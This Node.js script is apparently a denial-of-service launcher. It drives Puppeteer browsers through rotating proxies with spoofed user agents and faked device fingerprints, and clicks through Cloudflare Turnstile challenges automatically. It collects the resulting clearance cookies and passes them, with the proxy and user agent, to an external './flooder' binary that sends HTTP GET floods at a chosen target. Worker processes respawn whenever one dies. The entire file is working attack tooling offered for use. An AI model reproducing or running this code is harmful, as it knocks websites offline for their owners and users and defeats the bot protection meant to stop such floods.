const puppeteer = require('puppeteer');
const { spawn } = require('child_process');
const fs = require('fs');
const cluster = require('cluster');
const os = require('os');

let [target, time, threads, requests, proxyfile, winlin, debug] = process.argv.slice(2);

// Đoc proxy
const proxies = fs.readFileSync(proxyfile, "utf-8")
    .toString()
    .replace(/\r/g, "")
    .split("\n")
    .filter((word) => word.trim().length > 0);

// Đoc noi dung script
let scriptContent = '';
try {
    scriptContent = fs.readFileSync('script.js', 'utf8');
} catch (e) {
    console.error('⚠️ File script.js not found!');
    process.exit(1);
}

// Error handlers
process.on("uncaughtException", function (error) { console.error(error) });
process.on("unhandledRejection", function (error) { console.error(error) });
process.setMaxListeners(0);

// Helper
const log = (string) => {
    const now = new Date();
    const h = String(now.getHours()).padStart(2, '0');
    const m = String(now.getMinutes()).padStart(2, '0');
    const s = String(now.getSeconds()).padStart(2, '0');
    console.log(`(${h}:${m}:${s}) - ${string}`);
};

let sessionCount = 0;
requests = parseInt(requests || 1);

// Main browser logic
async function main(proxy) {
    let browser;
    try {
        sessionCount++;
        log(`[BROWSER #${sessionCount}] Starting session...`);
        const chromeVer = Math.floor(Math.random() * 3) + 119;
        const osType = winlin === "Windows" ? "Windows NT 10.0; Win64; x64" : "X11; Linux x86_64";
        const userAgent = `Mozilla/5.0 (${osType}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${chromeVer}.0.0.0 Safari/537.36`;
        const port = 1000 + Math.floor(Math.random() * 59000);

        browser = await puppeteer.launch({
            headless: false,
            args: [
                '--incognito',
                '--no-sandbox',
                '--disable-gpu',
                '--disable-dev-shm-usage',
                '--start-maximized',
                '--disable-features=IsolateOrigins,site-per-process',
                '--proxy-server=' + proxy,
                `--remote-debugging-port=${port}`,
                '--user-agent=' + userAgent
            ],
            ignoreDefaultArgs: ['--enable-automation'],
            defaultViewport: null,
        });

        const page = await browser.newPage();

        // fake device
        const deviceMemories = [2, 4, 8];
        const memory = deviceMemories[Math.floor(Math.random() * deviceMemories.length)];
        const threads = deviceMemories[Math.floor(Math.random() * deviceMemories.length)];
        const script = `(() => { ${scriptContent}; abc(${threads}, ${memory}, ${Math.random()}) })()`;

        await page.evaluate(script);
        await page.goto('about:blank');
        await page.goto(target);

        // Mo tab moi
        await page.evaluate((target) => window.open(target, '_blank'), target);
        await new Promise(res => setTimeout(res, 5000));

        const pages = await browser.pages();
        const newPage = pages[pages.length - 1];
        const title = await newPage.title();

        log(`[BROWSER #${sessionCount}] Title: ${title} | UA: ${userAgent}`);

        // Turnstile
        await new Promise(res => setTimeout(res, 2000));
        await turnstile(newPage);
        await new Promise(res => setTimeout(res, 3000));

        const cookie = await newPage.cookies();
        const cookieString = cookie.map(c => `${c.name}=${c.value}`).join("; ");

        log(`[BROWSER #${sessionCount}] Cookie: ${cookieString}`);

        if (["Just a moment...", "Checking your browser...", "Access denied"].includes(title)) {
            log(`[BROWSER #${sessionCount}] Challenge detected. Closing.`);
            await browser.close();
        } else {
            gogoebashit(cookieString, userAgent, proxy);
            await browser.close();
        }

    } catch (err) {
        if (debug === "true") console.error(err);
    } finally {
        if (browser) await browser.close();
        const nextProxy = proxies[Math.floor(Math.random() * proxies.length)];
        main(nextProxy);
    }
}

// Turnstile handler
async function turnstile(page) {
    const iframe = await page.$('iframe[allow="cross-origin-isolated; fullscreen"]');
    if (!iframe) return;

    const box = await iframe.boundingBox();
    if (!box) return;

    const x = box.x + box.width / 2;
    const y = box.y + box.height / 2;
    log(`[BROWSER #${sessionCount}] Turnstile click at ${x}, ${y}`);

    await page.mouse.move(x, y);
    await page.mouse.down();
    await new Promise(r => setTimeout(r, 150));
    await page.mouse.up();
}

// Goi flooder
function gogoebashit(cookie, ua, proxy) {
    const args = [
        "GET", target, time, requests,
        "--browserp", proxy,
        "--browseru", ua,
        "--cookie", cookie
    ];
    if (debug === "true") args.push("--debug");

    const proc = spawn('./flooder', args, { stdio: 'pipe' });
    proc.stdout.on('data', data => console.log(`${data}`));
}

// Cluster
function start() {
    const proxy = proxies[Math.floor(Math.random() * proxies.length)];
    main(proxy);
}

if (cluster.isMaster) {
    Array.from({ length: threads }, (_, i) => cluster.fork({ core: i % os.cpus().length }));
    cluster.on('exit', worker => {
        log(`Worker ${worker.process.pid} died. Restarting...`);
        cluster.fork({ core: worker.id % os.cpus().length });
    });
    setTimeout(() => {
        log('Master process exiting...');
        process.exit(0);
    }, time * 1000);
} else {
    start();
    setTimeout(() => {
        log(`Worker ${process.pid} exiting...`);
        process.exit(0);
    }, time * 1000);
}
